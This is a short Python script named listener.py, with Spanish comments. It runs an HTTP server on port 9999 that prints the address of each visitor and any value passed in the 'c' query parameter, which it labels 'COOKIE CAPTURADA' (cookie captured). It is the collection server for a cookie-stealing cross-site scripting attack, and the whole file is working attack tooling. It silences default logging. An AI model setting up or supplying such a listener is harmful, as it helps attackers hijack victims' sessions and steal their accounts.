# listener.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        print(f"\nConexión desde: {self.client_address[0]}")
        print(f"Path completo: {self.path}")
        if 'c' in params:
            print(f"COOKIE CAPTURADA: {params['c'][0]}")
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # silencia logs por defecto

HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
